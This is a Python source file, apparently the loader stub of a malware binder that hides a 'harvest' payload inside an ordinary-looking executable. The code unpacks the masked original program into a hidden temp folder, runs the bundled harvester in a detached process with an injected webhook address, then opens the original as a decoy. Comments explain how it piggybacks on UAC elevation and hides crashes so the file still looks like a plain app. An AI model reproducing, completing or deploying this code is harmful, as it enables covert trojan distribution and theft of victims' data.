"""Loader that runs inside the binder stub. Not executed directly.

A bound file is:

    [stub.exe][masked payload][meta json][meta len:u32][MAGIC]

masked payload = xor(zlib(original)). The mask is not for secrecy — it keeps
another program's archive signature out of the trailer, so the stub still
finds its own bundle no matter what was bound.

On launch the stub reads its own image, restores the original to %TEMP%,
starts the harvest in a detached child, and opens the original.
"""

from __future__ import annotations

import ctypes
import json
import os
import struct
import subprocess
import sys
import tempfile
import zlib
from pathlib import Path

MAGIC = b"OXBIND01"
XOR_KEY = b"oxbind\x00v1\x7f\x11keep-the-cookie-out-of-the-tail"
MAX_META = 1 << 20

DETACHED_PROCESS = 0x00000008
CREATE_NEW_CONSOLE = 0x00000010
CREATE_NEW_PROCESS_GROUP = 0x00000200

FILE_ATTRIBUTE_HIDDEN = 0x00000002
IMAGE_SUBSYSTEM_WINDOWS_GUI = 2
IMAGE_SUBSYSTEM_WINDOWS_CUI = 3

_DEBUG = os.environ.get("OXDEBUG", "")


def _trace(step: str) -> None:
    if not _DEBUG:
        return
    try:
        with open(_DEBUG, "a", encoding="utf-8") as fh:
            fh.write(f"{os.getpid()} {step}\n")
    except OSError:
        pass


def _trace_exc(where: str) -> None:
    if not _DEBUG:
        return
    import traceback
    _trace(f"{where} EXC " + traceback.format_exc().replace("\n", " | ")[-1500:])


def mask(data: bytes) -> bytes:
    """XOR against a repeating key; big-int path keeps it C-speed."""
    if not data:
        return b""
    stream = (XOR_KEY * (len(data) // len(XOR_KEY) + 1))[:len(data)]
    return (int.from_bytes(data, "big") ^ int.from_bytes(stream, "big")).to_bytes(len(data), "big")


# --------------------------------------------------------------------------
# self image
# --------------------------------------------------------------------------

def _self_bytes() -> bytes:
    path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    try:
        return Path(path).read_bytes()
    except OSError:
        return b""


def _split(blob: bytes):
    """Return (meta, original_bytes) or None when this file is not bound."""
    if len(blob) < len(MAGIC) + 4 or not blob.endswith(MAGIC):
        return None
    end = len(blob) - len(MAGIC)
    (meta_len,) = struct.unpack("<I", blob[end - 4:end])
    if meta_len == 0 or meta_len > MAX_META:
        return None
    meta_start = end - 4 - meta_len
    if meta_start < 0:
        return None
    try:
        meta = json.loads(blob[meta_start:end - 4].decode("utf-8"))
        size = int(meta["size"])
        blob_len = int(meta["blob"])
        name = str(meta["name"])
    except (ValueError, KeyError, UnicodeDecodeError):
        return None
    data_start = meta_start - blob_len
    if data_start < 0 or not name or blob_len <= 0:
        return None
    try:
        data = zlib.decompress(mask(blob[data_start:meta_start]))
    except zlib.error:
        return None
    if len(data) != size:
        return None
    return meta, data


# --------------------------------------------------------------------------
# payload
# --------------------------------------------------------------------------

def _harvest_source() -> str:
    base = getattr(sys, "_MEIPASS", None)
    candidates = []
    if base:
        candidates.append(Path(base) / "harvest.py")
    candidates.append(Path(__file__).resolve().parent / "payload" / "harvest.py")
    for path in candidates:
        if path.is_file():
            return path.read_text(encoding="utf-8")
    raise SystemExit("harvest.py missing from bundle")


def run_payload(meta: dict) -> None:
    source = _harvest_source()
    source = source.replace('WEBHOOK = "__WEBHOOK__"',
                            f"WEBHOOK = {meta.get('webhook', '')!r}")
    source = source.replace('APP_ID = "__APP_ID__"',
                            f"APP_ID = {meta.get('app_id', 'default')!r}")
    namespace = {"__name__": "_hv", "__file__": "<hv>"}
    exec(compile(source, "<hv>", "exec"), namespace)
    _trace("harvest loaded")
    namespace["start"]()


# --------------------------------------------------------------------------
# launch helpers
# --------------------------------------------------------------------------

def _self_cmd(*extra: str) -> list[str]:
    if getattr(sys, "frozen", False):
        return [sys.executable, *extra]
    return [sys.executable, os.path.abspath(__file__), *extra]


def _child_env() -> dict:
    """PyInstaller 6 marks its own unpacked home in the environment. A child we
    start inherits those marks, decides the archive is already unpacked, and
    points at *our* _MEIxxxxx — which we then delete on exit, taking its stdlib
    with it. That is the 'failed to remove temporary directory' box too. Strip
    the marks so every process unpacks its own home."""
    return {k: v for k, v in os.environ.items()
            if not k.startswith("_PYI_") and k != "_MEIPASS2"}


def _spawn_payload() -> None:
    subprocess.Popen(_self_cmd("--ox-payload"),
                     creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                     close_fds=True, stdin=subprocess.DEVNULL,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     env=_child_env())


def _drop(meta: dict, data: bytes) -> Path:
    folder = Path(tempfile.gettempdir()) / f"~{os.getpid():x}{len(data):x}"
    folder.mkdir(parents=True, exist_ok=True)
    path = folder / str(meta["name"])
    path.write_bytes(data)
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(path), FILE_ATTRIBUTE_HIDDEN)
        ctypes.windll.kernel32.SetFileAttributesW(str(folder), FILE_ATTRIBUTE_HIDDEN)
    except Exception:
        pass
    return path


def _subsystem(data: bytes):
    try:
        if data[:2] != b"MZ":
            return None
        pe = struct.unpack_from("<I", data, 0x3C)[0]
        if data[pe:pe + 4] != b"PE\0\0":
            return None
        opt = pe + 24
        if struct.unpack_from("<H", data, opt)[0] not in (0x10B, 0x20B):
            return None
        return struct.unpack_from("<H", data, opt + 68)[0]
    except (struct.error, IndexError):
        return None


def wants_admin(data: bytes) -> bool:
    """True when the target's own manifest demands elevation.

    A requireAdministrator host cannot be started by a non-elevated parent:
    CreateProcess refuses with 740, and ShellExecute costs a second UAC prompt
    on a hidden temp path. Building the stub with the same manifest moves that
    single prompt onto the bound file the user actually double-clicked, and the
    dropped host then inherits elevation instead of asking again.
    """
    if b"requestedExecutionLevel" not in data:
        return False
    level = data.split(b"requestedExecutionLevel", 1)[1][:128]
    return b"requireAdministrator" in level


def _launch(path: Path, data: bytes) -> None:
    subsystem = _subsystem(data)
    if subsystem is None:
        os.startfile(str(path))
        return
    flags = CREATE_NEW_CONSOLE if subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI \
        else DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
    try:
        subprocess.Popen([str(path), *sys.argv[1:]],
                         creationflags=flags, close_fds=True, cwd=str(path.parent),
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, env=_child_env())
    except OSError:
        # WinError 740: the target's manifest demands elevation. ShellExecute
        # raises the UAC prompt; CreateProcess refuses outright.
        os.startfile(str(path))


# --------------------------------------------------------------------------
# entry
# --------------------------------------------------------------------------

def main() -> int:
    _trace("start")
    blob = _self_bytes()
    parsed = _split(blob)
    _trace(f"split={parsed is not None} size={len(blob)}")
    if parsed is None:
        return 1
    meta, data = parsed

    if "--ox-payload" in sys.argv:
        _trace("payload child")
        run_payload(meta)
        _trace("payload done")
        return 0

    target = _drop(meta, data)
    _trace(f"dropped {target}")
    _spawn_payload()
    _trace("payload spawned")
    _launch(target, data)
    _trace("launched")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except BaseException:
        # --noconsole builds pop a modal traceback dialog and hang there; a
        # silent non-zero exit keeps the bound file looking like a plain app.
        _trace_exc("fatal")
        raise SystemExit(1)
